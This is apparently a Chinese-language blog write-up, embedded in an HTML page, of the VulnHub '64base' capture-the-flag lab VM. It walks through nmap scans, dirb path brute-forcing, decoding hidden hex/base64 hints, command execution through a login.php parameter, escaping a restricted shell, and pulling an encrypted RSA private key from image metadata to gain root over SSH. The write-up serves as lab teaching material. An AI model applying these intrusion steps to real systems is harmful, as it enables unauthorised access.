@@ -1,0 +1,749 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="&lt;Theo/&gt;">
+    <title>VulnHub #64base - &lt;Theo/&gt;</title>
+    <meta name="author" content="Theo Chen">
+    
+        <meta name="keywords" content="vulnhub,writeup,64base">
+    
+    
+        <link rel="icon" href="https://blog.theo.com.tw/assets/images/favicon.ico">
+    
+    
+        
+            <link rel="alternate" type="application/rss+xml" title="RSS" href="/rss2.xml">
+        
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"},"articleBody":"Official website: 64Base: 1.0.1 ~ VulnHub\n\n\n(I use bridged network because I run the victim VM on different host in my local network.)\n掃描 IP 位址1234567891011121314151617181920$ nmap -sP 192.168.31.1/24...Nmap scan report for 192.168.31.175Host is up (0.00039s latency).MAC Address: 08:00:27:68:E7:F8 (Oracle VirtualBox virtual NIC)...$ nmap -p- -sS 192.168.31.175Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-10 13:14 UTCNmap scan report for 192.168.31.175Host is up (0.025s latency).Not shown: 65531 closed portsPORT      STATE SERVICE22/tcp    open  ssh80/tcp    open  http4899/tcp  open  radmin62964/tcp open  unknownNmap done: 1 IP address (1 host up) scanned in 28.62 seconds\n\n80 port 有開 http，決定先從網站開始著手 PT。\n大標題dmlldyBzb3VyY2UgO0QK 很有趣，雖然它並沒有 base64 編碼最醒目的 == 結尾，但大標題就寫著 64base 了還是先嘗試看看，而且 == 也不是 base64 一定會有的特徵，只是用來彌補編碼字串長度不足的添加字元。\n解碼以後得到了作者貼心的提示：view source ;D\n在原始碼裡可以看到這一段，也就是大標題那段的原始碼：\n123456&lt;div class=&quot;site-heading&quot;&gt;\t&lt;h1&gt;64base&lt;/h1&gt;\t&lt;hr class=&quot;small&quot;&gt;\t&lt;span class=&quot;subheading&quot;&gt;dmlldyBzb3VyY2UgO0QK&lt;/span&gt;&lt;!--5a6d78685a7a4637546d705361566c59546d785062464a7654587056656c464953587055616b4a56576b644752574e7151586853534842575555684b6246524551586454656b5a77596d316a4d454e6e5054313943673d3d0a--&gt;&lt;/div&gt;\n\n可以看到一串非常長的編碼，稍微看一下便可以斷言絕對不是 base64 編碼，原因很間單，因為整個字串的組成只有數字跟英文字母 a ～ e。身為一個碼農，看到這個格式第一個就冒出了十六進位編碼的想法（雖然字串裡並沒有出現 f），直接 hex to ASCII，得到一個新的字串：ZmxhZzF7TmpSaVlYTmxPbFJvTXpVelFISXpUakJVWkdGRWNqQXhSSHBWUUhKbFREQXdTekZwYm1jMENnPT19Cg==，這個 base64 太明顯了，解碼以後成功找到第一個 flag：flag1&#123;NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg==&#125;。\n這個 flag 內容本身也是一個 base64 編碼的字串，解開來是 64base:Th353@r3N0TdaDr01DzU@reL00K1ing4，目前還看不出什麼意義，猜想可能是帳號密碼之類的。\n掃描網站除了首頁的大標題有明顯的提示以外，其他頁面稍微看了看沒有看到其他明顯的提示，於是開始做一些例行的自動化檢測網站動作，先掃描一下網頁路徑，網站有 robots.txt。\n\n123$ wget http://192.168.31.175/robots.txt$ sed &#x27;1d&#x27; robots.txt | awk &#x27;&#123;print $2&#125;&#x27; &gt; list.txt$ dirb http://192.168.31.175 list.txt -S -r\n\n除了其他路徑都是空白的資料夾以外，找到 http://192.168.31.175/admin 是一個 HTML WWW-Authenticate 的登入頁面，嘗試剛剛從 flag1 拿到的帳號密碼仍然無法登入，看來踏進了一個死胡同。在思考如何繞過 WWW-Authenticate 的同時，覺得單純透過 robots.txt 來爆破網頁路徑應該會有所疏漏，決定擷取網站所有的單詞來猜測&#x2F;爆破可能的路徑。\n123456$ wget http://192.168.31.175 -rq -O 64base$ html2dic 64base | sort -u &gt; list.txt$ dirb http://192.168.31.175 list -S -r...+ http://192.168.31.175/Imperial-Class (CODE:401|SIZE:461)...\n\n發現了一個新的路徑：http://192.168.31.175/Imperial-Clas，同樣也是一個 HTML WWW-Authenticate 的登入頁面，再次嘗試 flag1 的帳號密碼，成功登入來到了新畫面。\n\n在這邊又卡了死胡同很久，直到仔細看了網站的唯一篇文章，在文章最後發現了細節：\n真實的路徑應該要更改成這樣：http://192.168.31.175/Imperial-Class/BountyHunter，覺得這個關卡真的太通靈了…再拿 flag1 得到的帳號密碼是一次無法登入，檢視原始碼的時候發現有奇特的編碼字串：\n12345678910111213141516171819202122232425262728&lt;body bgcolor=#000000&gt;&lt;font color=#cfbf00&gt;&lt;form name=&quot;login-form&quot; id=&quot;login-form&quot; method=&quot;post&quot; action=&quot;./login.php&quot;&gt;  &lt;fieldset&gt;  &lt;legend&gt;Please login:&lt;/legend&gt;  &lt;dl&gt;    &lt;dt&gt;      &lt;label title=&quot;Username&quot;&gt;Username:      &lt;input tabindex=&quot;1&quot; accesskey=&quot;u&quot; name=&quot;function&quot; type=&quot;text&quot; maxlength=&quot;50&quot; id=&quot;5a6d78685a7a4a37595568534d474e4954545a4d65546b7a5a444e6a645756&quot; /&gt;      &lt;/label&gt;    &lt;/dt&gt;  &lt;/dl&gt;  &lt;dl&gt;    &lt;dt&gt;      &lt;label title=&quot;Password&quot;&gt;Password:      &lt;input tabindex=&quot;2&quot; accesskey=&quot;p&quot; name=&quot;command&quot; type=&quot;password&quot; maxlength=&quot;15&quot; id=&quot;584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c32&quot; /&gt;            &lt;/label&gt;    &lt;/dt&gt;  &lt;/dl&gt;  &lt;dl&gt;    &lt;dt&gt;      &lt;label title=&quot;Submit&quot;&gt;      &lt;input tabindex=&quot;3&quot; accesskey=&quot;l&quot; type=&quot;submit&quot; name=&quot;cmdlogin&quot; value=&quot;Login&quot; /&gt;      &lt;!-- basictoken=52714d544a54626d51315a45566157464655614446525557383966516f3d0a --&gt;      &lt;/label&gt;    &lt;/dt&gt;  &lt;/dl&gt;  &lt;/fieldset&gt;&lt;/form&gt;\n\n有一行被註解的 basictoken，看起來又是文字轉十六進位的編碼，轉回正常的文字後再一次 base64 解碼發現失敗了，回頭再仔細看原始碼發現 username 跟 password 都多了一個 id，看起來一樣的原理，把三個字串串接起來以後再次解碼，即可得到 flag2：flag2&#123;aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj12Snd5dEZXQTh1QQo=&#125;，flag 再解碼一次拿到一個 Youtube連結，看不出有什麼明顯的提示，唯一只有標題有提到 burp，感覺是在暗示 Burp Suite。\n仔細回頭看剛剛的登入頁面，注意到 form 表單會提交給 login.php 再 302 跳轉回來 index.php，用 cURL 檢查一下被跳轉的 login.php 便發現了 flag3：\n123$ curl -u &#x27;64base:Th353@r3N0TdaDr01DzU@reL00K1ing4&#x27; http://192.168.31.175/Imperial-Class/BountyHunter/login.phpflag3&#123;NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2luLnBocD9mPWV4ZWMmYz1pZAo=&#125;\n\n解釋一下為什麼要用 cURL， cURL 預設是不會跟隨重新導向的，所以可以得到目標路徑的結果。如果要讓 cURL 跟隨重新導向的話，加上 -L 參數即可。\n再一次的，把 flag3 的內容解碼後得到了新的提示：53cr3t5h377/Imperial-Class/BountyHunter/login.php?f=exec&amp;c=id\n該路徑畫面除了標題以外其他沒有任何東西，乍看之下感覺又是一個死胡同，但先前才花了很多時間找 flag2，這邊提示還是在文章最後：\n提示說要用 system 而不要用 exec，那麼把剛剛的路徑修改一下：http://192.168.31.175/Imperial-Class/BountyHunter/login.php?f=system&amp;c=id，找到 flag4 。\nFlag4 解碼後得到新的帳號密碼：64base:64base5h377。\n新的方向感覺 web 的部分現階段挖得差不多了，把目標轉移到一開始用 Nmap 掃描得到其他開啟的 port。首先先試 ssh。\n12345678910111213$ ssh 64base@192.168.31.175ssh: connect to host 192.168.31.175 port 22: Connection refused$ nc 192.168.31.175 22The programs included with the Fedora GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Fedora GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Mon Oct 24 02:04:10 4025 from 010.101.010.001#\n\n似乎是一個假的 ssh service，先擱著。再來嘗試 4899 port。\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778$ nc 192.168.31.175 4899sshhh! ssh! droids!So..You found a way in then...but, can you pop root?                                           /~\\                                          |oo )    Did you hear that?                                          _\\=/_                          ___            /  _  \\                         / ()\\          //|/.\\|\\\\                       _|_____|_        \\\\ \\_/  ||                      | | === | |        \\|\\ /| ||                      |_|  O  |_|        # _ _/ #                       ||  O  ||          | | |                       ||__*__||          | | |                      |~ \\___/ ~|         []|[]                      /=\\ /=\\ /=\\         | | |      ________________[_]_[_]_[_]________/_]_[_\\_________________________\n\n目前也還看不出什麼目的，繼續嘗試最後的 62964 port。\n12$ nc 192.168.31.175 62964SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u3\n\n哦！看起來是一個真的 ssh service，立刻嘗試 ssh 指令，密碼就用 flag4 解碼得到的 64base5h377，可惜登入失敗了，flag1 的密碼也同樣登入失敗。\n123$ ssh 64base@192.168.31.175 -p6296464base@192.168.31.175&#x27;s password:Permission denied, please try again.\n\n\n因為期間機器有重新設定，所以接下來 Victim 的 IP 從 192.168.31.175 改成 192.168.31.184\n\n這裡大概卡了一個多禮拜，才想到這個 VM 的名稱就以 base64 來命名的，何不把 flag4 拿到的密碼再用 base64 邊一次呢？Bingo！密碼就是 64base5h377 的 base64 編碼\n進去以後檢查了一下當前目錄、一些常用的指令不可用，發現自己在一個被限制的 shell，檢查環境變數時候發現幾個點：\n\nSHELL 的確是 /bin/rbash\nPATH 是 /var/alt-bin\n\n/var/alt-bin 底下有這些檔案：\n12345678910111213141516171819/var/alt-bin/awk/var/alt-bin/base64/var/alt-bin/cat/var/alt-bin/dircolors/var/alt-bin/droids/var/alt-bin/egrep/var/alt-bin/env/var/alt-bin/fgrep/var/alt-bin/file/var/alt-bin/find/var/alt-bin/grep/var/alt-bin/head/var/alt-bin/less/var/alt-bin/ls/var/alt-bin/more/var/alt-bin/perl/var/alt-bin/python/var/alt-bin/ruby/var/alt-bin/tail\n\n有些常用的指令都並不是原本的結果，例如：\n別擔心，因為 /usr/bin 還在而且正確的 find 執行檔也還在，所以我利用 find 指令來看看有沒有以 flag 命名的檔案：\n12$ /usr/bin/find / -name &quot;*flag5*&quot; 2&gt;/dev/null/var/www/html/admin/S3cR37/flag5&#123;TG9vayBJbnNpZGUhIDpECg==&#125;\n\n不過當我在寫這篇文章要重現這個步驟時卻失效了，又花了一些時間研究才發現，/var/alt-bin/droids 這個檔案很重要，$ droids 執行以後會出現 code matrix 的動畫，按 q 鍵可以離開，PATH 環境變數會被更正！這時再執行 /usr/bin/find 便可以正常找到 flag。\n照慣例還是看看 flag 轉碼以後是什麼：Look Inside! :D\n\n看起來是一張圖片，中間有個註解看起來很顯眼，格式像是十六進位，轉回文字看看：\n看起來這是一個 RSA 的私鑰！在 VM 裡面 rbash 太綁手綁腳了，於是想把檔案拿出來在本機研究。既然可以 SSH 進入 VM，那麼 scp 指令應該可行！\n1$ scp /var/www/html/admin/S3cR37/flag5&#123;TG9vayBJbnNpZGUhIDpECg==&#125; theo@192.168.31.142:~/Desktop/flag5.jpg\n\n得到的圖片：\n剛剛看到的註解讓我有些在意，想看看會不會有完整的 RSA 私鑰：\n12345678910111213141516171819202122232425$ exiftool flag5.jpgExifTool Version Number         : 10.80File Name                       : flag5.jpgDirectory                       : .File Size                       : 192 kBFile Modification Date/Time     : 2018:05:12 22:33:25+08:00File Access Date/Time           : 2018:05:12 22:36:19+08:00File Inode Change Date/Time     : 2018:05:12 22:36:12+08:00File Permissions                : rw-r--r--File Type                       : JPEGFile Type Extension             : jpgMIME Type                       : image/jpegJFIF Version                    : 1.01Resolution Unit                 : inchesX Resolution                    : 72Y Resolution                    : 72Comment                         : 4c5330744c5331435255644a546942535530456755464a4a566b46555253424c52566b744c5330744c517051636d396a4c565235634755364944517352553544556c6c5156455645436b52460a5379314a626d5a764f69424252564d744d5449344c554e43517977324d6a46424d7a68425155513052546c475155457a4e6a55335130457a4f44673452446c434d7a553251776f4b625552300a556e684a643267304d464a54546b467a4d697473546c4a49646c4d356557684e4b325668654868564e586c795231424461334a6955566376556d64515543745352307043656a6c57636c52720a646c6c334e67705a59303931575756615457707a4e475a4a55473433526c7035536d64345230686f5533685262336857626a6c7252477433626e4e4e546b5270636e526a62304e50617a6c530a524546484e5756344f58673056453136436a684a624552435558453161546c5a656d6f35646c426d656d56435246706b53586f35524863795a323479553246465a335531656d56734b7a5a490a52303969526a686161444e4e53574e6f6554687a4d5668795254414b61335a4d53306b794e544a74656c64334e47746955334d354b31466856336c6f4d7a52724f45704a566e7031597a46520a51336c69656a56586231553157545532527a5a784d564a6b637a426959315a785446567a5a51704e5533704c617a4e745332465851586c4d574778764e3078756258467856555a4c5347356b0a516b557855326851566c5a704e47497752336c475355785054335a3062585a47596a5172656d68314e6d705056316c49436d73796147524453453554644374705a3264354f57686f4d3270680a52576456626c4e51576e56464e30354b6430525a5954646c553052685a3077784e31684c634774744d6c6c70516c5a7956566834566b31756232494b643168535a6a56435930644c56546b330a65475276636c59795648457261446c4c553278615a5463354f58527956484a475230356c4d4456326545527961576f315658517953324e52654373354f457334533342585441706e645570510a556c424c52326c71627a6b3253455248597a4e4d4e566c7a65453969566d63724c325a714d4546326330746d636d4e574c327834595663725357313562574d7854566870536b316962554e360a62455233436c52425632316863577453526b52355154464956585a30646c4e6c566e46544d533949616d6845647a6c6b4e45747a646e4e71613270326557565256484e7a5a6e4e6b52324e560a4d47684561316833556c647a6332514b4d6d517a5279744f616d3078556a56615445356e556d784f63465a48616d684c517a524263325a59557a4e4b4d486f7964444e4355453035576b39430a54554a6c4f5552344f4870744e58684757546c365633527964677042523342794d454a6f4f45745264323177616c4656597a46685a6e4e78595646594d465649546b7859564446615431644c0a616d63305530457a57454d355a454e4665555a784d464e4a65464671547a6c4d52304e48436a52524e57356a5a6c566f62585a3063586c3164454e7362444a6b5746427a57465a455a54526c0a6230517851327432536b354557544e4c554663725232744f4f5577724f554e516554677252453531626b5a4a6433674b4b3151724b7a64525a7939315546684c6354524e4e6a464a555467770a4d7a52566148565356314d30564846514f57463657444e44527a6c4d65573970516a5a57596b74505a555233546a68686157784d533170436377706d57546c524e6b464e4d584e3562476c360a53444675626e684c5433526155566431636e68715230704353584d324d6e526c6245317259584d356555354e617a4e4d64546478556b6732633364504f584e6b56454a70436974714d4867300a64555261616b706a5a30315965475a694d4863315154593062466c4763303153656b5a714e31686b5a6e6b784f53744e5a54684b525768524f45744f57455233555574456556564d526b39550a63336f4b4d544e575a6b4a4f65466c7a65557731656b6459546e703563566f3053533950547a644e5a575179616a4248656a426e4d6a4670534545764d445a74636e4d795932786b637a5a540a56554a4852585a754f4535705667707955334a494e6e5a46637a5254656d63776544686b5a45643255544278567a463254577455556e557a54336b765a544577526a63304e586845545546550a53314a7353316f32636c6c4954554e34536a4e4a59323530436b56364d45394e57466c6b517a5a4461555976535664305a3252564b32684c65585a7a4e484e4764454e4359327854595764740a5246524b4d6d74615a485530556c4a3357565a574e6d394a546e6f35596e4250646b554b556e677a534656785a6d354c553268796458704e4f56707261556c7264564e6d556e526d615531320a596c52365a6d5a4b56464d30597a513451303831574339535a5559765157464e654774695532524654305a7a53517047646a6c595a476b355532524f6458684853455579527a5249646b706b0a53584279526c5679566c4e7755306b344d48646e636d49794e44567a647a5a6e5647397064466f354d47684b4e47354b4e5746354e304648436c6c7059574531627a63344e7a63765a6e63320a57566f764d6c557a5155526b61564e50516d3072614770574d6b705765484a7665565659596b63315a475a734d32303452335a6d4e7a464b4e6a4a4753484534646d6f4b63557068626c4e720a4f4445334e586f77596d70795746646b5445637a52464e735355707063327851567974355247466d4e316c43566c6c33563149725645457861304d326157564a5154563056544e776269394a0a4d776f324e466f31625842444b3364785a6c52345232646c51334e6e53577335646c4e754d6e41765a5756305a456b7a5a6c46584f46645952564a69524756304d56564d5346427864456c700a4e314e61596d6f3464697451436d5a7553457852646b563353584d72516d59785133424c4d554672576d565654564a4655577443614552704e7a4a49526d4a334d6b6376656e46306153395a0a5a4735786545463562445a4d576e704a5a5646754f48514b4c3064714e477468636b6f78615530355357597a4f57524e4e55396851315a615569395554304a575956493462584a514e315a300a536d39794f57706c53444a305255777764473946635664434d56424c4d48565955416f744c5330744c55564f524342535530456755464a4a566b46555253424c52566b744c5330744c516f3d0aImage Width                     : 960Image Height                    : 720Encoding Process                : Baseline DCT, Huffman codingBits Per Sample                 : 8Color Components                : 3Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)Image Size                      : 960x720Megapixels                      : 0.691\n\n果然有完整的私鑰！馬上把編碼轉換回來：\n12345678910111213141516171819202122232425262728293031$ echo &quot;4c5330744c5331435255644a546942535530456755464a4a566b46555253424c52566b744c5330744c517051636d396a4c565235634755364944517352553544556c6c5156455645436b52460a5379314a626d5a764f69424252564d744d5449344c554e43517977324d6a46424d7a68425155513052546c475155457a4e6a55335130457a4f44673452446c434d7a553251776f4b625552300a556e684a643267304d464a54546b467a4d697473546c4a49646c4d356557684e4b325668654868564e586c795231424461334a6955566376556d64515543745352307043656a6c57636c52720a646c6c334e67705a59303931575756615457707a4e475a4a55473433526c7035536d64345230686f5533685262336857626a6c7252477433626e4e4e546b5270636e526a62304e50617a6c530a524546484e5756344f58673056453136436a684a624552435558453161546c5a656d6f35646c426d656d56435246706b53586f35524863795a323479553246465a335531656d56734b7a5a490a52303969526a686161444e4e53574e6f6554687a4d5668795254414b61335a4d53306b794e544a74656c64334e47746955334d354b31466856336c6f4d7a52724f45704a566e7031597a46520a51336c69656a56586231553157545532527a5a784d564a6b637a426959315a785446567a5a51704e5533704c617a4e745332465851586c4d574778764e3078756258467856555a4c5347356b0a516b557855326851566c5a704e47497752336c475355785054335a3062585a47596a5172656d68314e6d705056316c49436d73796147524453453554644374705a3264354f57686f4d3270680a52576456626c4e51576e56464e30354b6430525a5954646c553052685a3077784e31684c634774744d6c6c70516c5a7956566834566b31756232494b643168535a6a56435930644c56546b330a65475276636c59795648457261446c4c553278615a5463354f58527956484a475230356c4d4456326545527961576f315658517953324e52654373354f457334533342585441706e645570510a556c424c52326c71627a6b3253455248597a4e4d4e566c7a65453969566d63724c325a714d4546326330746d636d4e574c327834595663725357313562574d7854566870536b316962554e360a62455233436c52425632316863577453526b52355154464956585a30646c4e6c566e46544d533949616d6845647a6c6b4e45747a646e4e71613270326557565256484e7a5a6e4e6b52324e560a4d47684561316833556c647a6332514b4d6d517a5279744f616d3078556a56615445356e556d784f63465a48616d684c517a524263325a59557a4e4b4d486f7964444e4355453035576b39430a54554a6c4f5552344f4870744e58684757546c365633527964677042523342794d454a6f4f45745264323177616c4656597a46685a6e4e78595646594d465649546b7859564446615431644c0a616d63305530457a57454d355a454e4665555a784d464e4a65464671547a6c4d52304e48436a52524e57356a5a6c566f62585a3063586c3164454e7362444a6b5746427a57465a455a54526c0a6230517851327432536b354557544e4c554663725232744f4f5577724f554e516554677252453531626b5a4a6433674b4b3151724b7a64525a7939315546684c6354524e4e6a464a555467770a4d7a52566148565356314d30564846514f57463657444e44527a6c4d65573970516a5a57596b74505a555233546a68686157784d533170436377706d57546c524e6b464e4d584e3562476c360a53444675626e684c5433526155566431636e68715230704353584d324d6e526c6245317259584d356555354e617a4e4d64546478556b6732633364504f584e6b56454a70436974714d4867300a64555261616b706a5a30315965475a694d4863315154593062466c4763303153656b5a714e31686b5a6e6b784f53744e5a54684b525768524f45744f57455233555574456556564d526b39550a63336f4b4d544e575a6b4a4f65466c7a65557731656b6459546e703563566f3053533950547a644e5a575179616a4248656a426e4d6a4670534545764d445a74636e4d795932786b637a5a540a56554a4852585a754f4535705667707955334a494e6e5a46637a5254656d63776544686b5a45643255544278567a463254577455556e557a54336b765a544577526a63304e586845545546550a53314a7353316f32636c6c4954554e34536a4e4a59323530436b56364d45394e57466c6b517a5a4461555976535664305a3252564b32684c65585a7a4e484e4764454e4359327854595764740a5246524b4d6d74615a485530556c4a3357565a574e6d394a546e6f35596e4250646b554b556e677a534656785a6d354c553268796458704e4f56707261556c7264564e6d556e526d615531320a596c52365a6d5a4b56464d30597a513451303831574339535a5559765157464e654774695532524654305a7a53517047646a6c595a476b355532524f6458684853455579527a5249646b706b0a53584279526c5679566c4e7755306b344d48646e636d49794e44567a647a5a6e5647397064466f354d47684b4e47354b4e5746354e304648436c6c7059574531627a63344e7a63765a6e63320a57566f764d6c557a5155526b61564e50516d3072614770574d6b705765484a7665565659596b63315a475a734d32303452335a6d4e7a464b4e6a4a4753484534646d6f4b63557068626c4e720a4f4445334e586f77596d70795746646b5445637a52464e735355707063327851567974355247466d4e316c43566c6c33563149725645457861304d326157564a5154563056544e776269394a0a4d776f324e466f31625842444b3364785a6c52345232646c51334e6e53577335646c4e754d6e41765a5756305a456b7a5a6c46584f46645952564a69524756304d56564d5346427864456c700a4e314e61596d6f3464697451436d5a7553457852646b563353584d72516d59785133424c4d554672576d565654564a4655577443614552704e7a4a49526d4a334d6b6376656e46306153395a0a5a4735786545463562445a4d576e704a5a5646754f48514b4c3064714e477468636b6f78615530355357597a4f57524e4e55396851315a615569395554304a575956493462584a514e315a300a536d39794f57706c53444a305255777764473946635664434d56424c4d48565955416f744c5330744c55564f524342535530456755464a4a566b46555253424c52566b744c5330744c516f3d0a&quot; | xxd -p -r | base64 -D-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,621A38AAD4E9FAA3657CA3888D9B356CmDtRxIwh40RSNAs2+lNRHvS9yhM+eaxxU5yrGPCkrbQW/RgPP+RGJBz9VrTkvYw6YcOuYeZMjs4fIPn7FZyJgxGHhSxQoxVn9kDkwnsMNDirtcoCOk9RDAG5ex9x4TMz8IlDBQq5i9Yzj9vPfzeBDZdIz9Dw2gn2SaEgu5zel+6HGObF8Zh3MIchy8s1XrE0kvLKI252mzWw4kbSs9+QaWyh34k8JIVzuc1QCybz5WoU5Y56G6q1Rds0bcVqLUseMSzKk3mKaWAyLXlo7LnmqqUFKHndBE1ShPVVi4b0GyFILOOvtmvFb4+zhu6jOWYHk2hdCHNSt+iggy9hh3jaEgUnSPZuE7NJwDYa7eSDagL17XKpkm2YiBVrUXxVMnobwXRf5BcGKU97xdorV2Tq+h9KSlZe799trTrFGNe05vxDrij5Ut2KcQx+98K8KpWLguJPRPKGijo96HDGc3L5YsxObVg+/fj0AvsKfrcV/lxaW+Imymc1MXiJMbmCzlDwTAWmaqkRFDyA1HUvtvSeVqS1/HjhDw9d4KsvsjkjvyeQTssfsdGcU0hDkXwRWssd2d3G+Njm1R5ZLNgRlNpVGjhKC4AsfXS3J0z2t3BPM9ZOBMBe9Dx8zm5xFY9zWtrvAGpr0Bh8KQwmpjQUc1afsqaQX0UHNLXT1ZOWKjg4SA3XC9dCEyFq0SIxQjO9LGCG4Q5ncfUhmvtqyutCll2dXPsXVDe4eoD1CkvJNDY3KPW+GkN9L+9CPy8+DNunFIwx+T++7Qg/uPXKq4M61IQ8034UhuRWS4TqP9azX3CG9LyoiB6VbKOeDwN8ailLKZBsfY9Q6AM1sylizH1nnxKOtZQWurxjGJBIs62telMkas9yNMk3Lu7qRH6swO9sdTBi+j0x4uDZjJcgMXxfb0w5A64lYFsMRzFj7Xdfy19+Me8JEhQ8KNXDwQKDyULFOTsz13VfBNxYsyL5zGXNzyqZ4I/OO7Med2j0Gz0g21iHA/06mrs2clds6SUBGEvn8NiVrSrH6vEs4Szg0x8ddGvQ0qW1vMkTRu3Oy/e10F745xDMATKRlKZ6rYHMCxJ3IcntEz0OMXYdC6CiF/IWtgdU+hKyvs4sFtCBclSagmDTJ2kZdu4RRwYVV6oINz9bpOvERx3HUqfnKShruzM9ZkiIkuSfRtfiMvbTzffJTS4c48CO5X/ReF/AaMxkbSdEOFsIFv9Xdi9SdNuxGHE2G4HvJdIprFUrVSpSI80wgrb245sw6gToitZ90hJ4nJ5ay7AGYiaa5o7877/fw6YZ/2U3ADdiSOBm+hjV2JVxroyUXbG5dfl3m8Gvf71J62FHq8vjqJanSk8175z0bjrXWdLG3DSlIJislPW+yDaf7YBVYwWR+TA1kC6ieIA5tU3pn/I364Z5mpC+wqfTxGgeCsgIk9vSn2p/eetdI3fQW8WXERbDet1ULHPqtIi7SZbj8v+PfnHLQvEwIs+Bf1CpK1AkZeUMREQkBhDi72HFbw2G/zqti/YdnqxAyl6LZzIeQn8t/Gj4karJ1iM9If39dM5OaCVZR/TOBVaR8mrP7VtJor9jeH2tEL0toEqWB1PK0uXP-----END RSA PRIVATE KEY-----\n\n私鑰到手，接下來嘗試用這個私鑰看看能不能以 root 的身份登入 ssh：\n12// 我已經把私鑰存在 key 這個檔案裡了$ ssh -p62964 root@192.168.31.184 -i key\n\n\n都到這一步了結果又要密碼！東想西想想到剛剛看到的那張圖片上面有字：USE THE FORCE，嘗試了一下最後用 usetheforce 成功登入了 root，flag6 到手。\n最後 flag6 當然也還是來解碼一下，發現它十六進位 + base64 不斷的循環，重複解碼幾次以後得到最後的明文：base64 -d /var/local/.luke|less.real 是一條指令，當然就來去 VM 裡試試，原來是最後的小彩蛋 XDD，滿有趣的。\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246        \\ \\        / / | | | |  __ \\          \\ \\  /\\  / /__| | | | |  | | ___  _ __   ___           \\ \\/  \\/ / _ \\ | | | |  | |/ _ \\| &#x27;_ \\ / _ \\            \\  /\\  /  __/ | | | |__| | (_) | | | |  __/         __  \\/ _\\/ \\___|_|_|_|_____/ \\___/|_|_|_|\\___| _         \\ \\   / /          |  __ \\(_)   | | |_   _| | | |          \\ \\_/ /__  _   _  | |  | |_  __| |   | | | |_| |           \\   / _ \\| | | | | |  | | |/ _` |   | | | __| |            | | (_) | |_| | | |__| | | (_| |  _| |_| |_|_|            |_|\\___/ \\__,_| |_____/|_|\\__,_| |_____|\\__(_)_____ _ _ _ __ __ __  _ ___ _   __  ___  __ __  __  _  ___ _ _  __ _________%=x%= | |V| |_)|_ |_) | |_| |   |_) |_| (_  |_  |_) |  |_| |\\| (_  %=x%=x%=x~~~~~ | | | |  |_ | \\ | | | |_  |_) | | __) |_  |   |_ | | | | __) ~~~~~~~~~LS                 .-. .-.               .=========.         E x t e r i o r ,   A e r i a l   V i e w               ||.-.7.-.||         -----------------------------------------               ||`-&#x27; `-&#x27;||               `=========&#x27;                `-&#x27;| |`-&#x27;8               1 .............. Sensor Suite Tower          ______   |9|   ______          2 ... Heavy Twin Turbolaser Turrets         /     /\\__| |__/\\     \\         3 ............. Heavy Laser Turrets        /  \\_ / /  |_|  \\ \\ _/  \\        4 ....... TIE Fighter Launch Chutes       /___(\\\\\\/         \\///)___\\       5 ............... Heavy Blast Doors       \\____\\\\`===========&#x27;//____/       6 .................... Guard towers       /     &#x27;/ .-------. \\\\     \\       7 ........ Shuttle Landing Platform    __/     //. \\`+---+&#x27;/ .\\\\     \\__    8 ........... AT-AT Docking Station   /\\ \\    ///x`.\\|___|/.&#x27;x\\\\\\    / /\\   9 ................. Connecting Ramp  /  \\ \\  //`-._//|   |\\\\_.2&#x27;\\\\  / /  \\ /  _.-===&#x27;_____//.-=-.\\\\_____`===-._  \\ \\   `-===.\\-.  \\ `-=1&#x27; /  .-/.===-&#x27; 3 / The pre-fabricated,  multi-function  \\  / /  \\\\\\ \\  \\.===./  /4///  \\ \\  /  Imperial garrison base is the back-   \\/_/    \\\\\\ | /.---.\\ | ///    \\_\\/   bone of the  Empire&#x27;s  occupational      \\     \\\\\\|/ |_m_| \\|///     /      forces. These heavily-armoured for-       \\_____\\=============/_____/       tresses have  walls up to 10 meters       /____///    ___    \\\\\\____\\       thick  to  guard   against   ground       \\   (_//\\__|||||__/\\\\_)   /       assaults,  and  powerful  deflector        \\  /  \\|,,|||||,,|/  \\  /        shields  protect  them  for  air or         \\_____|  | 5 | 6|_____/         space attacks.               `--&#x27;   `--&#x27;____________________________________________________________________________%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                           U           E x t e r i o r ,   S i d e   V i e w                          /_\\          -------------------------------------                       1 [___]                         :`:&#x27;:           1 .............. Sensor Suite Tower                         `:::&#x27;           2 ... Heavy Twin Turbolaser Turrets                  _       :_:       _    3 ............. Heavy Laser Turrets                =[ ]2     [%]      [ ]=  4 ....... Tie Fighter Launch Chutes                 :=:      :=:      :=:   5 ............... Heavy Blast Doors                _|_|_   __| |__   _|_|_  6 .................... Guard Towers               / /XX|\\ /__|_|__\\ /|XX\\ \\         3    /4/XXX| | 